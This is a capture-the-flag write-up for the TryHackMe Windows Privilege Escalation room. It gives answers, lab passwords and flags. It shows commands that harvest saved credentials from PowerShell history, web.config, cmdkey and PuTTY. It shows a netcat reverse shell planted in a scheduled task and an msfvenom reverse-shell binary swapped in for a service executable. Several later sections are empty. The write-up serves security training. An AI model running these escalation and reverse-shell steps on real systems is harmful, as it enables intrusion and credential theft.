![Windows Privilege Escalation Banner](windowsprivesc20/Windows_Privilege_Escalation_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windowsprivesc20/Windows_Privilege_Escalation_Cover.png" alt="Windows Privilege Escalation Logo">
</p>

# Windows Privilege Escalation

This guide contains the answer and steps necessary to get to them for the [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20) room.

## Table of contents

- [Windows Privilege Escalation](#windows-privilege-escalation)
- [Harvesting Passwords from Usual Spots](#harvesting-passwords-from-usual-spots)
- [Other Quick Wins](#other-quick-wins)
- [Abusing Service Misconfigurations](#abusing-service-misconfigurations)
- [Abusing dangerous privileges](#abusing-dangerous-privileges)
- [Abusing vulnerable software](#abusing-vulnerable-software)
- [Tools of the Trade ](#tools-of-the-trade)

### Windows Privilege Escalation

1. Users that can change system configurations are part of which group?

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>Administrators</details>

2. The SYSTEM account has more privileges than the Administrator user (aye/nay)

   This answer can be found in the text.

   ><details><summary>Click for answer</summary>aye</details>

### Harvesting Passwords from Usual Spots

1. A password for the julia.jones user has been left on the Powershell history. What is the password?

   We can use the following cmd command to list the powershell history.

   ```cmd
   type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
   ```

   HARVESTING POWERHSELL

   ><details><summary>Click for answer</summary>ZuperCkretPa5z</details>

2. A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?

   First we open the config file located at: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`. We then look for any mentions of the account `db_admin`.

   HARVESTING IIS

   ><details><summary>Click for answer</summary>098n0x35skjD3</details>

2. There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.

   Looking through the stored credentials, we can see mikes credentials are indeed on the system.

   ```cmd
   cmdkey /list
   ```

   HARVESTING CREDS

   Now we can spawn a shell under this user and view the flag.

   ```cmd
   runas /savecred /user:admin cmd.exe
   ```

   HARVESTING FLAG
   
   ><details><summary>Click for answer</summary>THM{WHAT_IS_MY_PASSWORD}/details>

4. Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?

   We can use the following command to view stored credentials in Putty.

   ```cmd
   reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
   ```

   HARVESTING PUTTY

   ><details><summary>Click for answer</summary>CoolPass2021</details>

### Other Quick Wins

1. What is the taskusr1 flag?

   First we query the task scheduler to find more information on the misconfigured task.

   ```cmd
   schtasks /query /tn vulntask /fo list /v
   ```

   QUICK TASK

   Using `icacls` we can see the permission we have to modify this file. Looks like we can edit it.

   ```cmd
   icacls C:\tasks\schtask.bat
   ```
   
   QUICK PERMISSIONS

   Now lets edit the bat file to execute our reverse shell.

   ```cmd
   echo C:\Tools\nc64.exe -e cmd.exe 10.18.78.136 1337 > C:\tasks\schtask.bat
   ```

   QUICK SCRIPT

   Last thing to do, is set up our listener and run the task manually.

   ```cmd
   nc -nlvp 1337

   schtasks /run /tn vulntask
   ```
   
   QUICK REVERSE SHELL

   Now we can navigate to the users desktop and read the flag.

   QUICK FLAG

   ><details><summary>Click for answer</summary>THM{TASK_COMPLETED}</details>

### Abusing Service Misconfigurations

1. Get the flag on svcusr1's desktop.

   Lets first query the service configuration and see if we have permission to modify the executable.

   ```cmd
   sc qc WindowsScheduler

   icacls C:\PROGRA~2\SYSTEM~1\WService.exe
   ```

   SERVICES PERMISSIONS

   Looks like we can. Now we can make our reverse payload with msfvenom.

   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f exe-service -o rev-svc.exe

   python3 -m http.server 8080

   nc -nlvp 1337
   ```

   After setting up our http server and listener we can use powershell on the target system to transfer the file.

   ```cmd
   wget 10.18.78.136:8080/rev-svc.exe -o rev-svc.exe
   ```

   Now we can create a backup of the original executabel and copy our own into the folder.

   ```cmd
   move WService.exe WService.exe.bkp
   move C:\Users\thm-unpriv\rev-svc.exe WService.exe
   icacls WService.exe /grant Everyone:F
   ```

   SERVICES MOVE FILE
   
   The last thing to do, is stopping the service and then restarting it.

   ```cmd
   sc stop windowsscheduler
   sc start windowsscheduler
   ```

   SERVICES CONNECTION
   
   Now we can look for the flag on the users desktop.

   SERVICES FLAG1

   ><details><summary>Click for answer</summary>THM{AT_YOUR_SERVICE}</details>

3. Get the flag on svcusr2's desktop.



   ><details><summary>Click for answer</summary></details>

4. Get the flag on the Administrator's desktop.



   ><details><summary>Click for answer</summary></details>

### Abusing dangerous privileges




### Abusing vulnerable software




### Tools of the Trade 



1. 

   

   ><details><summary>Click for answer</summary></details>
